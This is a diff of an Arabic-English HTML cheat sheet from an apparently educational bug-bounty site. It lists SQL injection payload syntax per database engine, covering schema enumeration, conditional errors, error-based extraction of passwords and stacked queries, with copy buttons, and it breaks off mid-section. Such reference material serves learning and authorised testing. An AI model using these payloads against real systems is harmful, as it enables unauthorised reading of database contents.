@@ -2,178 +2,287 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>SQL Injection Master Cheat Sheet - Bug Bounty Academy</title>
+  <title>SQL Injection Master Cheat Sheet | Bug Bounty Academy</title>
   <link rel="stylesheet" href="../assets/css/style.css?v=1.0">
   <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=Fira+Code:wght@400;600&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=Fira+Code:wght@400;600&family=Outfit:wght@600;800&display=swap" rel="stylesheet">
   <style>
-    body { background-color: #0d1117; color: #c9d1d9; font-family: 'Cairo', sans-serif; margin: 0; padding: 0; line-height: 1.8; }
-    .doc-container { max-width: 1150px; margin: 0 auto; padding: 30px 20px; }
-    .doc-header { border-bottom: 2px solid #30363d; padding-bottom: 20px; margin-bottom: 30px; }
-    .doc-title { font-size: 2.2rem; color: #f97316; font-weight: 800; display: flex; align-items: center; gap: 12px; }
-    .doc-subtitle { color: #8b949e; font-size: 1.1rem; }
-    .section-card { background: #161b22; border: 1px solid #30363d; border-radius: 10px; padding: 25px; margin-bottom: 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); }
-    .section-title { font-size: 1.4rem; color: #58a6ff; border-right: 4px solid #f97316; padding-right: 12px; margin-top: 0; margin-bottom: 20px; }
-    .cs-table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 0.88rem; direction: ltr; text-align: left; }
-    .cs-table th { background: #21262d; color: #f97316; padding: 10px; border-bottom: 1px solid #30363d; }
-    .cs-table td { padding: 10px; border-bottom: 1px solid #21262d; font-family: 'Fira Code', monospace; color: #38bdf8; word-break: break-all; }
-    .cs-table tr:hover { background: #0d1117; }
-    .db-badge { font-weight: bold; padding: 2px 6px; border-radius: 4px; font-size: 0.75rem; display: inline-block; width: 85px; text-align: center; }
-    .db-oracle { background: rgba(239, 68, 68, 0.2); color: #f87171; border: 1px solid #ef4444; }
-    .db-mssql { background: rgba(59, 130, 246, 0.2); color: #60a5fa; border: 1px solid #3b82f6; }
-    .db-postgres { background: rgba(168, 85, 247, 0.2); color: #c084fc; border: 1px solid #a855f7; }
-    .db-mysql { background: rgba(245, 158, 11, 0.2); color: #fbbf24; border: 1px solid #f59e0b; }
-    .btn-copy { background: #21262d; border: 1px solid #30363d; color: #fff; padding: 4px 8px; border-radius: 4px; cursor: pointer; font-size: 0.75rem; float: right; }
-    .btn-copy:hover { background: #f97316; color: #000; }
+    :root {
+      --bg-dark: #060913;
+      --card-bg: #0d1322;
+      --card-border: rgba(48, 63, 96, 0.4);
+      --accent-orange: #f97316;
+      --accent-cyan: #38bdf8;
+      --accent-gold: #facc15;
+    }
+    body { background: radial-gradient(circle at top center, #111827 0%, #060913 100%); color: #e2e8f0; font-family: 'Cairo', sans-serif; margin: 0; padding: 0; line-height: 1.8; min-height: 100vh; }
+    .doc-container { max-width: 1400px; margin: 0 auto; padding: 40px 25px; }
+    
+    .doc-header { background: rgba(13, 19, 34, 0.8); border: 1px solid var(--card-border); backdrop-filter: blur(12px); border-radius: 16px; padding: 30px; margin-bottom: 35px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); }
+    .doc-title { font-size: 2.4rem; color: #fff; font-weight: 800; display: flex; align-items: center; gap: 15px; margin: 10px 0; }
+    .doc-title i { color: var(--accent-orange); filter: drop-shadow(0 0 10px rgba(249, 115, 22, 0.5)); }
+    .doc-subtitle { color: #94a3b8; font-size: 1.15rem; margin: 0; }
+
+    /* SEARCH & FILTER CONTROLS */
+    .controls-bar { display: flex; gap: 20px; flex-wrap: wrap; margin-bottom: 30px; align-items: center; justify-content: space-between; }
+    .search-box { position: relative; flex: 1; min-width: 300px; }
+    .search-box i { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: #64748b; font-size: 1.3rem; }
+    .search-input { width: 100%; background: #0d1322; border: 1px solid var(--card-border); padding: 12px 45px 12px 15px; border-radius: 10px; color: #fff; font-family: 'Cairo', sans-serif; font-size: 1rem; outline: none; transition: all 0.3s; }
+    .search-input:focus { border-color: var(--accent-cyan); box-shadow: 0 0 15px rgba(56, 189, 248, 0.2); }
+    
+    .filter-tabs { display: flex; gap: 10px; flex-wrap: wrap; }
+    .filter-btn { background: #0d1322; border: 1px solid var(--card-border); color: #94a3b8; padding: 8px 18px; border-radius: 8px; cursor: pointer; font-weight: 700; font-size: 0.9rem; transition: all 0.3s; }
+    .filter-btn:hover, .filter-btn.active { background: var(--accent-orange); color: #000; border-color: var(--accent-orange); box-shadow: 0 4px 15px rgba(249, 115, 22, 0.3); }
+
+    /* SECTION CARDS */
+    .section-card { background: rgba(13, 19, 34, 0.7); border: 1px solid var(--card-border); backdrop-filter: blur(10px); border-radius: 14px; padding: 28px; margin-bottom: 30px; transition: transform 0.3s, border-color 0.3s; }
+    .section-card:hover { border-color: rgba(56, 189, 248, 0.4); transform: translateY(-2px); }
+    .section-title { font-size: 1.5rem; color: var(--accent-cyan); border-right: 4px solid var(--accent-orange); padding-right: 15px; margin-top: 0; margin-bottom: 22px; font-weight: 800; display: flex; align-items: center; justify-content: space-between; }
+
+    /* TABLE STYLING */
+    .cs-table-wrapper { overflow-x: auto; border-radius: 10px; border: 1px solid rgba(255,255,255,0.05); }
+    .cs-table { width: 100%; border-collapse: collapse; direction: ltr; text-align: left; font-size: 0.92rem; }
+    .cs-table th { background: #161f36; color: var(--accent-gold); padding: 14px 18px; font-family: 'Outfit', sans-serif; text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem; }
+    .cs-table td { padding: 14px 18px; border-bottom: 1px solid rgba(255,255,255,0.04); font-family: 'Fira Code', monospace; color: #38bdf8; vertical-align: middle; }
+    .cs-table tr:last-child td { border-bottom: none; }
+    .cs-table tr:hover td { background: rgba(255,255,255,0.02); }
+
+    /* DB BADGES */
+    .db-badge { font-weight: 800; padding: 6px 12px; border-radius: 6px; font-size: 0.8rem; display: inline-block; white-space: nowrap; text-align: center; font-family: 'Outfit', sans-serif; }
+    .db-oracle { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.4); }
+    .db-mssql { background: rgba(59, 130, 246, 0.15); color: #60a5fa; border: 1px solid rgba(59, 130, 246, 0.4); }
+    .db-postgres { background: rgba(168, 85, 247, 0.15); color: #c084fc; border: 1px solid rgba(168, 85, 247, 0.4); }
+    .db-mysql { background: rgba(245, 158, 11, 0.15); color: #fbbf24; border: 1px solid rgba(245, 158, 11, 0.4); }
+
+    /* COPY BUTTON */
+    .btn-copy { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: #e2e8f0; padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 0.8rem; font-family: 'Cairo', sans-serif; font-weight: 700; transition: all 0.2s; float: right; display: flex; align-items: center; gap: 5px; }
+    .btn-copy:hover { background: var(--accent-orange); color: #000; border-color: var(--accent-orange); box-shadow: 0 2px 10px rgba(249, 115, 22, 0.4); }
+
+    /* TOAST FEEDBACK */
+    .copy-toast { position: fixed; bottom: 30px; left: 30px; background: #22c55e; color: #000; padding: 12px 24px; border-radius: 8px; font-weight: 800; box-shadow: 0 10px 25px rgba(34, 197, 94, 0.4); z-index: 9999; display: none; animation: slideUp 0.3s ease; }
+    @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
   </style>
 </head>
 <body>
   <div class="doc-container">
     <header class="doc-header">
-      <a href="../index.html" style="color:#58a6ff; text-decoration:none; font-weight:bold;"><i class="bx bx-right-arrow-alt"></i> العودة للرئيسية</a>
-      <h1 class="doc-title"><i class="bx bx-data"></i> PortSwigger Official SQL Injection Cheat Sheet</h1>
-      <p class="doc-subtitle">الدليل المرجعي الرسمي المطابق لـ PortSwigger مع أزرار نسخ فوري لجميع قواعد البيانات.</p>
+      <a href="../index.html" style="color:var(--accent-cyan); text-decoration:none; font-weight:bold; display:inline-flex; align-items:center; gap:6px; margin-bottom:12px;"><i class="bx bx-right-arrow-alt" style="font-size:1.3rem;"></i> العودة للرئيسية</a>
+      <h1 class="doc-title"><i class="bx bx-data"></i> SQL Injection Master Cheat Sheet</h1>
+      <p class="doc-subtitle">الدليل المرجعي التفاعلي المتقدم المعتمد عالمياً لجميع استعلامات وثغرات SQL Injection عبر مختلف قواعد البيانات.</p>
     </header>
 
+    <!-- CONTROLS & SEARCH -->
+    <div class="controls-bar">
+      <div class="search-box">
+        <i class="bx bx-search"></i>
+        <input type="text" id="payload-search" class="search-input" placeholder="بحث سريع في الشفرات (مثال: sleep, version, concat, extractvalue)..." onkeyup="filterPayloads()">
+      </div>
+      <div class="filter-tabs">
+        <button class="filter-btn active" onclick="filterDB('all', this)">الكل (All DBs)</button>
+        <button class="filter-btn" onclick="filterDB('oracle', this)">Oracle</button>
+        <button class="filter-btn" onclick="filterDB('mssql', this)">MSSQL</button>
+        <button class="filter-btn" onclick="filterDB('postgres', this)">PostgreSQL</button>
+        <button class="filter-btn" onclick="filterDB('mysql', this)">MySQL</button>
+      </div>
+    </div>
+
     <!-- 1. STRING CONCATENATION -->
-    <div class="section-card">
-      <h2 class="section-title">1. String concatenation (دمج النصوص)</h2>
-      <table class="cs-table">
-        <thead><tr><th>DB Type</th><th>Payload</th></tr></thead>
-        <tbody>
-          <tr><td><span class="db-badge db-oracle">Oracle</span></td><td>'foo'||'bar' <button class="btn-copy" onclick="navigator.clipboard.writeText('\'foo\'||\'bar\'')">Copy</button></td></tr>
-          <tr><td><span class="db-badge db-mssql">MSSQL</span></td><td>'foo'+'bar' <button class="btn-copy" onclick="navigator.clipboard.writeText('\'foo\'+\'bar\'')">Copy</button></td></tr>
-          <tr><td><span class="db-badge db-postgres">PostgreSQL</span></td><td>'foo'||'bar' <button class="btn-copy" onclick="navigator.clipboard.writeText('\'foo\'||\'bar\'')">Copy</button></td></tr>
-          <tr><td><span class="db-badge db-mysql">MySQL</span></td><td>CONCAT('foo','bar') OR 'foo' 'bar' <button class="btn-copy" onclick="navigator.clipboard.writeText('CONCAT(\'foo\',\'bar\')')">Copy</button></td></tr>
-        </tbody>
-      </table>
+    <div class="section-card payload-card">
+      <h2 class="section-title"><span>1. String Concatenation (دمج النصوص)</span> <i class="bx bx-link-alt" style="color:#64748b;"></i></h2>
+      <div class="cs-table-wrapper">
+        <table class="cs-table">
+          <thead><tr><th style="width:140px;">DB Engine</th><th>Syntax Payload</th></tr></thead>
+          <tbody>
+            <tr data-db="oracle"><td><span class="db-badge db-oracle">ORACLE</span></td><td>'foo'||'bar' <button class="btn-copy" onclick="copyCode('\'foo\'||\'bar\'')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="mssql"><td><span class="db-badge db-mssql">MSSQL</span></td><td>'foo'+'bar' <button class="btn-copy" onclick="copyCode('\'foo\'+\'bar\'')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="postgres"><td><span class="db-badge db-postgres">POSTGRES</span></td><td>'foo'||'bar' <button class="btn-copy" onclick="copyCode('\'foo\'||\'bar\'')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="mysql"><td><span class="db-badge db-mysql">MYSQL</span></td><td>CONCAT('foo','bar') OR 'foo' 'bar' <button class="btn-copy" onclick="copyCode('CONCAT(\'foo\',\'bar\')')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+          </tbody>
+        </table>
+      </div>
     </div>
 
     <!-- 2. SUBSTRING -->
-    <div class="section-card">
-      <h2 class="section-title">2. Substring (استخراج جزء من النص)</h2>
-      <table class="cs-table">
-        <thead><tr><th>DB Type</th><th>Payload</th></tr></thead>
-        <tbody>
-          <tr><td><span class="db-badge db-oracle">Oracle</span></td><td>SUBSTR('foobar', 4, 2) <button class="btn-copy" onclick="navigator.clipboard.writeText('SUBSTR(\'foobar\', 4, 2)')">Copy</button></td></tr>
-          <tr><td><span class="db-badge db-mssql">MSSQL</span></td><td>SUBSTRING('foobar', 4, 2) <button class="btn-copy" onclick="navigator.clipboard.writeText('SUBSTRING(\'foobar\', 4, 2)')">Copy</button></td></tr>
-          <tr><td><span class="db-badge db-postgres">PostgreSQL</span></td><td>SUBSTRING('foobar', 4, 2) <button class="btn-copy" onclick="navigator.clipboard.writeText('SUBSTRING(\'foobar\', 4, 2)')">Copy</button></td></tr>
-          <tr><td><span class="db-badge db-mysql">MySQL</span></td><td>SUBSTRING('foobar', 4, 2) <button class="btn-copy" onclick="navigator.clipboard.writeText('SUBSTRING(\'foobar\', 4, 2)')">Copy</button></td></tr>
-        </tbody>
-      </table>
+    <div class="section-card payload-card">
+      <h2 class="section-title"><span>2. Substring Extraction (استخراج الحروف والأجزاء)</span> <i class="bx bx-cut" style="color:#64748b;"></i></h2>
+      <div class="cs-table-wrapper">
+        <table class="cs-table">
+          <thead><tr><th style="width:140px;">DB Engine</th><th>Syntax Payload</th></tr></thead>
+          <tbody>
+            <tr data-db="oracle"><td><span class="db-badge db-oracle">ORACLE</span></td><td>SUBSTR('foobar', 4, 2) <button class="btn-copy" onclick="copyCode('SUBSTR(\'foobar\', 4, 2)')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="mssql"><td><span class="db-badge db-mssql">MSSQL</span></td><td>SUBSTRING('foobar', 4, 2) <button class="btn-copy" onclick="copyCode('SUBSTRING(\'foobar\', 4, 2)')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="postgres"><td><span class="db-badge db-postgres">POSTGRES</span></td><td>SUBSTRING('foobar', 4, 2) <button class="btn-copy" onclick="copyCode('SUBSTRING(\'foobar\', 4, 2)')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="mysql"><td><span class="db-badge db-mysql">MYSQL</span></td><td>SUBSTRING('foobar', 4, 2) <button class="btn-copy" onclick="copyCode('SUBSTRING(\'foobar\', 4, 2)')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+          </tbody>
+        </table>
+      </div>
     </div>
 
     <!-- 3. COMMENTS -->
-    <div class="section-card">
-      <h2 class="section-title">3. Comments (التعليقات وإبطال باقي الاستعلام)</h2>
-      <table class="cs-table">
-        <thead><tr><th>DB Type</th><th>Payload</th></tr></thead>
-        <tbody>
-          <tr><td><span class="db-badge db-oracle">Oracle</span></td><td>--comment <button class="btn-copy" onclick="navigator.clipboard.writeText('--comment')">Copy</button></td></tr>
-          <tr><td><span class="db-badge db-mssql">MSSQL</span></td><td>--comment OR /*comment*/ <button class="btn-copy" onclick="navigator.clipboard.writeText('--comment')">Copy</button></td></tr>
-          <tr><td><span class="db-badge db-postgres">PostgreSQL</span></td><td>--comment OR /*comment*/ <button class="btn-copy" onclick="navigator.clipboard.writeText('--comment')">Copy</button></td></tr>
-          <tr><td><span class="db-badge db-mysql">MySQL</span></td><td>#comment OR -- comment OR /*comment*/ <button class="btn-copy" onclick="navigator.clipboard.writeText('#comment')">Copy</button></td></tr>
-        </tbody>
-      </table>
+    <div class="section-card payload-card">
+      <h2 class="section-title"><span>3. Inline & Block Comments (إبطال باقي الاستعلام)</span> <i class="bx bx-comment-detail" style="color:#64748b;"></i></h2>
+      <div class="cs-table-wrapper">
+        <table class="cs-table">
+          <thead><tr><th style="width:140px;">DB Engine</th><th>Syntax Payload</th></tr></thead>
+          <tbody>
+            <tr data-db="oracle"><td><span class="db-badge db-oracle">ORACLE</span></td><td>--comment <button class="btn-copy" onclick="copyCode('--comment')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="mssql"><td><span class="db-badge db-mssql">MSSQL</span></td><td>--comment OR /*comment*/ <button class="btn-copy" onclick="copyCode('--comment')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="postgres"><td><span class="db-badge db-postgres">POSTGRES</span></td><td>--comment OR /*comment*/ <button class="btn-copy" onclick="copyCode('--comment')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="mysql"><td><span class="db-badge db-mysql">MYSQL</span></td><td>#comment OR -- comment OR /*comment*/ <button class="btn-copy" onclick="copyCode('#comment')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+          </tbody>
+        </table>
+      </div>
     </div>
 
     <!-- 4. DATABASE VERSION -->
-    <div class="section-card">
-      <h2 class="section-title">4. Database version (إصدار قاعدة البيانات)</h2>
-      <table class="cs-table">
-        <thead><tr><th>DB Type</th><th>Payload</th></tr></thead>
-        <tbody>
-          <tr><td><span class="db-badge db-oracle">Oracle</span></td><td>SELECT banner FROM v$version OR SELECT version FROM v$instance <button class="btn-copy" onclick="navigator.clipboard.writeText('SELECT banner FROM v$version')">Copy</button></td></tr>
-          <tr><td><span class="db-badge db-mssql">MSSQL</span></td><td>SELECT @@version <button class="btn-copy" onclick="navigator.clipboard.writeText('SELECT @@version')">Copy</button></td></tr>
-          <tr><td><span class="db-badge db-postgres">PostgreSQL</span></td><td>SELECT version() <button class="btn-copy" onclick="navigator.clipboard.writeText('SELECT version()')">Copy</button></td></tr>
-          <tr><td><span class="db-badge db-mysql">MySQL</span></td><td>SELECT @@version <button class="btn-copy" onclick="navigator.clipboard.writeText('SELECT @@version')">Copy</button></td></tr>
-        </tbody>
-      </table>
+    <div class="section-card payload-card">
+      <h2 class="section-title"><span>4. Database Version (فحص نوع وإصدار السيرفر)</span> <i class="bx bx-cog" style="color:#64748b;"></i></h2>
+      <div class="cs-table-wrapper">
+        <table class="cs-table">
+          <thead><tr><th style="width:140px;">DB Engine</th><th>Version Query Payload</th></tr></thead>
+          <tbody>
+            <tr data-db="oracle"><td><span class="db-badge db-oracle">ORACLE</span></td><td>SELECT banner FROM v$version OR SELECT version FROM v$instance <button class="btn-copy" onclick="copyCode('SELECT banner FROM v$version')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="mssql"><td><span class="db-badge db-mssql">MSSQL</span></td><td>SELECT @@version <button class="btn-copy" onclick="copyCode('SELECT @@version')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="postgres"><td><span class="db-badge db-postgres">POSTGRES</span></td><td>SELECT version() <button class="btn-copy" onclick="copyCode('SELECT version()')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="mysql"><td><span class="db-badge db-mysql">MYSQL</span></td><td>SELECT @@version <button class="btn-copy" onclick="copyCode('SELECT @@version')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+          </tbody>
+        </table>
+      </div>
     </div>
 
     <!-- 5. DATABASE CONTENTS -->
-    <div class="section-card">
-      <h2 class="section-title">5. Database contents (استكشاف الجدول والأعمدة)</h2>
-      <table class="cs-table">
-        <thead><tr><th>DB Type</th><th>Payload</th></tr></thead>
-        <tbody>
-          <tr><td><span class="db-badge db-oracle">Oracle</span></td><td>SELECT * FROM all_tables OR SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE' <button class="btn-copy" onclick="navigator.clipboard.writeText('SELECT * FROM all_tables')">Copy</button></td></tr>
-          <tr><td><span class="db-badge db-mssql">MSSQL</span></td><td>SELECT * FROM information_schema.tables OR SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' <button class="btn-copy" onclick="navigator.clipboard.writeText('SELECT * FROM information_schema.tables')">Copy</button></td></tr>
-          <tr><td><span class="db-badge db-postgres">PostgreSQL</span></td><td>SELECT * FROM information_schema.tables OR SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' <button class="btn-copy" onclick="navigator.clipboard.writeText('SELECT * FROM information_schema.tables')">Copy</button></td></tr>
-          <tr><td><span class="db-badge db-mysql">MySQL</span></td><td>SELECT * FROM information_schema.tables OR SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' <button class="btn-copy" onclick="navigator.clipboard.writeText('SELECT * FROM information_schema.tables')">Copy</button></td></tr>
-        </tbody>
-      </table>
+    <div class="section-card payload-card">
+      <h2 class="section-title"><span>5. Database Contents (استكشاف الجداول والأعمدة)</span> <i class="bx bx-folder-open" style="color:#64748b;"></i></h2>
+      <div class="cs-table-wrapper">
+        <table class="cs-table">
+          <thead><tr><th style="width:140px;">DB Engine</th><th>Schema Enumeration Query</th></tr></thead>
+          <tbody>
+            <tr data-db="oracle"><td><span class="db-badge db-oracle">ORACLE</span></td><td>SELECT * FROM all_tables OR SELECT * FROM all_tab_columns WHERE table_name = 'USERS' <button class="btn-copy" onclick="copyCode('SELECT * FROM all_tables')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="mssql"><td><span class="db-badge db-mssql">MSSQL</span></td><td>SELECT * FROM information_schema.tables OR SELECT * FROM information_schema.columns WHERE table_name = 'USERS' <button class="btn-copy" onclick="copyCode('SELECT * FROM information_schema.tables')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="postgres"><td><span class="db-badge db-postgres">POSTGRES</span></td><td>SELECT * FROM information_schema.tables OR SELECT * FROM information_schema.columns WHERE table_name = 'USERS' <button class="btn-copy" onclick="copyCode('SELECT * FROM information_schema.tables')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="mysql"><td><span class="db-badge db-mysql">MYSQL</span></td><td>SELECT * FROM information_schema.tables OR SELECT * FROM information_schema.columns WHERE table_name = 'USERS' <button class="btn-copy" onclick="copyCode('SELECT * FROM information_schema.tables')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+          </tbody>
+        </table>
+      </div>
     </div>
 
     <!-- 6. CONDITIONAL ERRORS -->
-    <div class="section-card">
-      <h2 class="section-title">6. Conditional errors (إحداث أخطاء شرطية)</h2>
-      <table class="cs-table">
-        <thead><tr><th>DB Type</th><th>Payload</th></tr></thead>
-        <tbody>
-          <tr><td><span class="db-badge db-oracle">Oracle</span></td><td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual <button class="btn-copy" onclick="navigator.clipboard.writeText('SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual')">Copy</button></td></tr>
-          <tr><td><span class="db-badge db-mssql">MSSQL</span></td><td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END <button class="btn-copy" onclick="navigator.clipboard.writeText('SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END')">Copy</button></td></tr>
-          <tr><td><span class="db-badge db-postgres">PostgreSQL</span></td><td>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END) <button class="btn-copy" onclick="navigator.clipboard.writeText('1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)')">Copy</button></td></tr>
-          <tr><td><span class="db-badge db-mysql">MySQL</span></td><td>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') <button class="btn-copy" onclick="navigator.clipboard.writeText('SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),\'a\')')">Copy</button></td></tr>
-        </tbody>
-      </table>
+    <div class="section-card payload-card">
+      <h2 class="section-title"><span>6. Conditional Errors (إحداث أخطاء شرطية متعمدة)</span> <i class="bx bx-error-alt" style="color:#64748b;"></i></h2>
+      <div class="cs-table-wrapper">
+        <table class="cs-table">
+          <thead><tr><th style="width:140px;">DB Engine</th><th>Error Trigger Payload</th></tr></thead>
+          <tbody>
+            <tr data-db="oracle"><td><span class="db-badge db-oracle">ORACLE</span></td><td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual <button class="btn-copy" onclick="copyCode('SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="mssql"><td><span class="db-badge db-mssql">MSSQL</span></td><td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END <button class="btn-copy" onclick="copyCode('SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="postgres"><td><span class="db-badge db-postgres">POSTGRES</span></td><td>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END) <button class="btn-copy" onclick="copyCode('1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="mysql"><td><span class="db-badge db-mysql">MYSQL</span></td><td>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') <button class="btn-copy" onclick="copyCode('SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),\'a\')')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+          </tbody>
+        </table>
+      </div>
     </div>
 
     <!-- 7. EXTRACTING DATA VIA VISIBLE ERROR MESSAGES -->
-    <div class="section-card">
-      <h2 class="section-title">7. Extracting data via visible error messages (تسريب البيانات عبر أخطاء النظام)</h2>
-      <table class="cs-table">
-        <thead><tr><th>DB Type</th><th>Payload & Leaked Error Example</th></tr></thead>
-        <tbody>
-          <tr><td><span class="db-badge db-mssql">MSSQL</span></td><td>SELECT 'foo' WHERE 1 = (SELECT 'secret') <br><span style="color:#f87171;">&gt; Conversion failed when converting the varchar value 'secret' to data type int.</span></td></tr>
-          <tr><td><span class="db-badge db-postgres">PostgreSQL</span></td><td>SELECT CAST((SELECT password FROM users LIMIT 1) AS int) <br><span style="color:#f87171;">&gt; invalid input syntax for integer: "secret"</span></td></tr>
-          <tr><td><span class="db-badge db-mysql">MySQL</span></td><td>SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret'))) <br><span style="color:#f87171;">&gt; XPATH syntax error: '\secret'</span></td></tr>
-        </tbody>
-      </table>
+    <div class="section-card payload-card">
+      <h2 class="section-title"><span>7. Visible Error Data Exfiltration (تسريب البيانات عبر رسائل النظام)</span> <i class="bx bx-bug" style="color:#64748b;"></i></h2>
+      <div class="cs-table-wrapper">
+        <table class="cs-table">
+          <thead><tr><th style="width:140px;">DB Engine</th><th>Exploit Payload & Leaked Output Example</th></tr></thead>
+          <tbody>
+            <tr data-db="mssql"><td><span class="db-badge db-mssql">MSSQL</span></td><td>SELECT 'foo' WHERE 1 = (SELECT 'secret') <br><span style="color:#f87171; font-size:0.82rem;">&gt; Conversion failed when converting the varchar value 'secret' to data type int.</span> <button class="btn-copy" onclick="copyCode('SELECT \'foo\' WHERE 1 = (SELECT \'secret\')')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="postgres"><td><span class="db-badge db-postgres">POSTGRES</span></td><td>SELECT CAST((SELECT password FROM users LIMIT 1) AS int) <br><span style="color:#f87171; font-size:0.82rem;">&gt; invalid input syntax for integer: "secret"</span> <button class="btn-copy" onclick="copyCode('SELECT CAST((SELECT password FROM users LIMIT 1) AS int)')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="mysql"><td><span class="db-badge db-mysql">MYSQL</span></td><td>SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret'))) <br><span style="color:#f87171; font-size:0.82rem;">&gt; XPATH syntax error: '\secret'</span> <button class="btn-copy" onclick="copyCode('SELECT \'foo\' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT \'secret\')))')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+          </tbody>
+        </table>
+      </div>
     </div>
 
     <!-- 8. BATCHED QUERIES -->
-    <div class="section-card">
-      <h2 class="section-title">8. Batched (or stacked) queries (الاستعلامات المتعددة المتتالية)</h2>
-      <table class="cs-table">
-        <thead><tr><th>DB Type</th><th>Payload</th></tr></thead>
-        <tbody>
-          <tr><td><span class="db-badge db-oracle">Oracle</span></td><td>Does not support batched queries.</td></tr>
-          <tr><td><span class="db-badge db-mssql">MSSQL</span></td><td>QUERY-1-HERE; QUERY-2-HERE <button class="btn-copy" onclick="navigator.clipboard.writeText('QUERY-1-HERE; QUERY-2-HERE')">Copy</button></td></tr>
-          <tr><td><span class="db-badge db-postgres">PostgreSQL</span></td><td>QUERY-1-HERE; QUERY-2-HERE <button class="btn-copy" onclick="navigator.clipboard.writeText('QUERY-1-HERE; QUERY-2-HERE')">Copy</button></td></tr>
-          <tr><td><span class="db-badge db-mysql">MySQL</span></td><td>QUERY-1-HERE; QUERY-2-HERE (Supported in specific PHP/Python APIs) <button class="btn-copy" onclick="navigator.clipboard.writeText('QUERY-1-HERE; QUERY-2-HERE')">Copy</button></td></tr>
-        </tbody>
-      </table>
+    <div class="section-card payload-card">
+      <h2 class="section-title"><span>8. Batched (Stacked) Queries (الاستعلامات المتعددة المتتالية)</span> <i class="bx bx-layer" style="color:#64748b;"></i></h2>
+      <div class="cs-table-wrapper">
+        <table class="cs-table">
+          <thead><tr><th style="width:140px;">DB Engine</th><th>Syntax Payload</th></tr></thead>
+          <tbody>
+            <tr data-db="oracle"><td><span class="db-badge db-oracle">ORACLE</span></td><td><span style="color:#94a3b8;">Does not support batched queries.</span></td></tr>
+            <tr data-db="mssql"><td><span class="db-badge db-mssql">MSSQL</span></td><td>QUERY-1-HERE; QUERY-2-HERE <button class="btn-copy" onclick="copyCode('QUERY-1-HERE; QUERY-2-HERE')"><i class="bx bx-copy"></i> Copy</button></td></tr>
